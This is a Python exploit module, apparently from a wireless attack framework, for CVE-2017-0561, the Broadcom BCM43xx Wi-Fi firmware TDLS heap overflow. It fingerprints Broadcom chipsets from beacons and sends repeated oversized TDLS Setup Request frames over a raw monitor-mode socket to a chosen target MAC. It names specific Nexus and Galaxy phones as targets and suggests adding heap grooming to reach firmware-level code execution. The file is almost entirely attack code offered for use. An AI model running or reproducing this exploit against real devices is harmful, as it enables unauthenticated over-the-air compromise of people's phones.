# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Broadcom BCM43xx Wi-Fi SoC TDLS Heap Buffer Overflow (CVE-2017-0561).

    The Broadcom Wi-Fi firmware on BCM4354, BCM4358 and BCM4359 chipsets
    contains a heap buffer overflow in the handler for TDLS (Tunneled Direct
    Link Setup) action frames.  A specially crafted TDLS Setup Request with
    an oversized Information Element triggers a memcpy past the allocated
    heap chunk, corrupting adjacent heap metadata and enabling code execution
    in the Wi-Fi firmware context.

    The attack is unauthenticated and executed over the air: the target only
    needs to have Wi-Fi enabled and be within radio range.

    CVSS v3.1: 10.0 (Critical), AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Broadcom BCM43xx TDLS Heap Buffer Overflow RCE (CVE-2017-0561)",
        "description": (
            "Exploits CVE-2017-0561 via the heap overflow in the TDLS action "
            "frame handler of Broadcom BCM43xx Wi-Fi firmware.  An oversized "
            "TDLS Setup Request Information Element triggers a heap memcpy "
            "overflow, corrupting firmware heap metadata.  Unauthenticated, "
            "over-the-air, no user interaction required."
        ),
        "authors": (
            "Gal Beniamini (Project Zero, discovery)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2017-0561",
            "https://googleprojectzero.blogspot.com/2017/04/over-air-exploiting-broadcoms-wi-fi_4.html",
            "https://source.android.com/security/bulletin/2017-04-01",
        ),
        "devices": (
            "Broadcom BCM4354 (Nexus 5X, Nexus 6)",
            "Broadcom BCM4358 (Samsung Galaxy S6/S6 Edge)",
            "Broadcom BCM4359 (Samsung Galaxy S7/S7 Edge)",
            "Nexus 6P",
            "Any device with BCM43xx Wi-Fi SoC (firmware before April 2017 patch)",
        ),
    }

    interface = OptString("wlan0", "Wireless interface in monitor mode")
    target_mac = OptString("", "Target station MAC address (XX:XX:XX:XX:XX:XX)")
    source_mac = OptString("", "Source MAC address (defaults to interface MAC)")
    channel = OptInteger(6, "Wi-Fi channel to operate on")
    timeout = OptFloat(3.0, "Socket timeout in seconds")
    spray_size = OptInteger(512, "Size of heap spray payload in bytes")
    fragment_count = OptInteger(8, "Number of TDLS fragments to send")

    # 802.11 frame constants
    _FC_ACTION = 0x00D0
    _TDLS_CATEGORY = 0x0C
    _TDLS_SETUP_REQUEST = 0x00

    # Broadcom vendor OUI
    _BCM_OUI = b"\x00\x10\x18"

    def _mac_to_bytes(self, mac: str) -> bytes:
        """Convert MAC string to 6 bytes."""
        return bytes(int(b, 16) for b in mac.split(":"))

    def _build_tdls_setup_request(self, oversized: bool = False) -> bytes:
        """Build a TDLS Setup Request action frame.

        When oversized is True, the Supported Rates IE is padded well beyond
        the firmware's expected maximum, triggering the heap overflow during
        reassembly.
        """
        target = self._mac_to_bytes(self.target_mac)
        source = self._mac_to_bytes(self.source_mac) if self.source_mac else b"\x02\x00\x00\x00\x00\x01"

        # Frame Control: Action frame
        fc = struct.pack("<H", self._FC_ACTION)
        duration = struct.pack("<H", 0)
        # Addr1=target, Addr2=source, Addr3=BSSID (use broadcast for TDLS)
        bssid = b"\xff\xff\xff\xff\xff\xff"

        seq_ctrl = struct.pack("<H", 0)

        header = fc + duration + target + source + bssid + seq_ctrl

        # Action frame body: Category=TDLS, Action=Setup Request
        body = struct.pack("BB", self._TDLS_CATEGORY, self._TDLS_SETUP_REQUEST)

        # Dialog Token
        body += struct.pack("B", 0x01)

        # Capability Information
        body += struct.pack("<H", 0x0421)

        # Supported Rates IE (ID=1)
        if oversized:
            # Trigger: length field says spray_size bytes, causing heap overflow
            rates_data = b"\xcc" * self.spray_size
            body += struct.pack("BB", 1, len(rates_data)) + rates_data
        else:
            # Normal probe: standard 8 supported rates
            rates_data = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
            body += struct.pack("BB", 1, len(rates_data)) + rates_data

        # TDLS Link Identifier IE (ID=101)
        link_ie = bssid + source + target
        body += struct.pack("BB", 101, len(link_ie)) + link_ie

        return header + body

    def _send_raw(self, frame: bytes) -> bool:
        """Send a raw 802.11 frame via a raw socket on the monitor interface."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((self.interface, 0))
            sock.send(frame)
            sock.close()
            return True
        except OSError as e:
            print_error(f"Raw socket send failed: {e}")
            return False

    def _detect_broadcom(self) -> bool:
        """Listen for beacon frames and check for Broadcom vendor OUI."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout * 2)
            sock.bind((self.interface, 0))

            deadline = time.time() + self.timeout * 2
            while time.time() < deadline:
                try:
                    data = sock.recv(4096)
                except TimeoutError:
                    break

                if len(data) < 36:
                    continue

                # Check if beacon frame (FC subtype 0x80)
                fc = struct.unpack("<H", data[0:2])[0]
                if (fc & 0x00FC) != 0x0080:
                    continue

                # Search for Vendor Specific IE (ID=221) with Broadcom OUI
                ie_start = 36
                pos = ie_start
                while pos + 2 < len(data):
                    ie_id = data[pos]
                    ie_len = data[pos + 1]
                    if pos + 2 + ie_len > len(data):
                        break
                    if ie_id == 221 and ie_len >= 3:
                        oui = data[pos + 2: pos + 5]
                        if oui == self._BCM_OUI:
                            sock.close()
                            return True
                    pos += 2 + ie_len

            sock.close()
        except OSError:
            pass
        return False

    def run(self) -> None:
        if not self.target_mac:
            print_error("target_mac is required (target station MAC address)")
            return

        if not self.check():
            print_error("Target does not appear to use a Broadcom Wi-Fi chipset")
            return

        print_success("Broadcom chipset detected; sending TDLS heap overflow sequence")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Detect Broadcom chipset presence via beacon vendor IEs."""
        if not self.target_mac:
            return False
        return self._detect_broadcom()

    def _exploit(self) -> None:
        print_status(
            f"Sending {self.fragment_count} oversized TDLS Setup Request frames "
            f"to {self.target_mac} on {self.interface} (spray size: {self.spray_size} bytes)"
        )

        for i in range(self.fragment_count):
            frame = self._build_tdls_setup_request(oversized=True)
            if not self._send_raw(frame):
                print_error(f"Failed to send frame {i + 1}/{self.fragment_count}")
                return
            print_info(
                f"  Frame {i + 1}/{self.fragment_count} sent ({len(frame)} bytes)"
            )
            time.sleep(0.05)

        print_success(
            "TDLS heap overflow sequence delivered. If the target runs vulnerable "
            "Broadcom firmware, the Wi-Fi SoC heap has been corrupted. Pair with "
            "a heap grooming primitive to achieve reliable firmware-level RCE."
        )
